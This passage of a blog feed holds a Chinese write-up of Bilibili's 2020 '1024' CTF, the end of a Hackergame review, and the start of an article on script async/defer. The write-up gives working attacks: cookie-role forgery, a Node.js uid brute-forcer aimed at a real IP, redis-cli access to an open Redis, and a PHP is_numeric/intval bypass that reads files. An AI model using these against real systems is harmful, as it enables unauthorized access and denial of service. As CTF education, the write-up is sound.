CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div>USTC Hackergame 2020（中科大信安赛）write up</div>\n<div><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-06</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/1.png\" width=\"1901\" height=\"720\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.<span class=\"hljs-title function_\">ajax</span>({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">\"flag1\"</span>);            input.<span class=\"hljs-property\">value</span> = <span class=\"hljs-title class_\">String</span>(data.<span class=\"hljs-property\">data</span>);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.<span class=\"hljs-title function_\">ajax</span>({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"flag2: \"</span> + data.<span class=\"hljs-property\">data</span>);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/2.png\" width=\"830\" height=\"301\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/3.png\" width=\"751\" height=\"666\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/4.png\" width=\"1905\" height=\"853\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/5.png\" width=\"431\" height=\"731\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/6.png\" width=\"1899\" height=\"543\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/7.png\" width=\"1901\" height=\"538\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.<span class=\"hljs-title function_\">ajax</span>({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);        <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.<span class=\"hljs-property\">data</span> + <span class=\"hljs-string\">\" }}\"</span>.<span class=\"hljs-title function_\">toLowerCase</span>() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/8.png\" width=\"646\" height=\"46\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/9.png\" width=\"1897\" height=\"512\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) {    (<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) {        $.getUrlParam = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) {            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">location</span>.<span class=\"hljs-property\">search</span>.<span class=\"hljs-title function_\">substr</span>(<span class=\"hljs-number\">1</span>).<span class=\"hljs-title function_\">match</span>(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.<span class=\"hljs-title function_\">getUrlParam</span>(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.<span class=\"hljs-title function_\">ajax</span>({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);            <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.<span class=\"hljs-property\">data</span>)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">get</span>(<span class=\"hljs-params\">hostname, path</span>) {  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.<span class=\"hljs-title function_\">request</span>(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.<span class=\"hljs-title function_\">push</span>(chunk); });        res.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            <span class=\"hljs-title function_\">resolve</span>(<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">concat</span>(body).<span class=\"hljs-title function_\">toString</span>());          } <span class=\"hljs-keyword\">catch</span> (e) {            <span class=\"hljs-title function_\">reject</span>(e);          }        });        req.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { <span class=\"hljs-title function_\">reject</span>(err); });      }    );    req.<span class=\"hljs-title function_\">setHeader</span>(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.<span class=\"hljs-title function_\">end</span>();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">get</span>(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">parse</span>(res).<span class=\"hljs-property\">code</span> === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/10.png\" width=\"1443\" height=\"870\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/11.png\" width=\"406\" height=\"168\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/12.png\" width=\"833\" height=\"573\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/13.png\" width=\"689\" height=\"145\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = <span class=\"hljs-title function_ invoke__\">intval</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = <span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-title function_ invoke__\">is_numeric</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-title function_ invoke__\">print_r</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div>Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-25</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">  <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">dataLayer</span> = <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">dataLayer</span> || [];</span><span class=\"language-javascript\">  <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">gtag</span>(<span class=\"hljs-params\"></span>){dataLayer.<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>);}</span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">gtag</span>(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>());</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">gtag</span>(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>){i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){</span><span class=\"language-javascript\">(i[r].<span class=\"hljs-property\">q</span>=i[r].<span class=\"hljs-property\">q</span>||[]).<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>)},i[r].<span class=\"hljs-property\">l</span>=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>();a=s.<span class=\"hljs-title function_\">createElement</span>(o),</span><span class=\"language-javascript\">m=s.<span class=\"hljs-title function_\">getElementsByTagName</span>(o)[<span class=\"hljs-number\">0</span>];a.<span class=\"hljs-property\">async</span>=<span class=\"hljs-number\">1</span>;a.<span class=\"hljs-property\">src</span>=g;m.<span class=\"hljs-property\">parentNode</span>.<span class=\"hljs-title function_\">insertBefore</span>(a,m)</span><span class=\"language-javascript\">})(<span class=\"hljs-variable language_\">window</span>,<span class=\"hljs-variable language_\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"language-javascript\"></span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) {  <span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>].<span class=\"hljs-property\">q</span> = (<span class=\"hljs-variable language_\">window</span>[<span 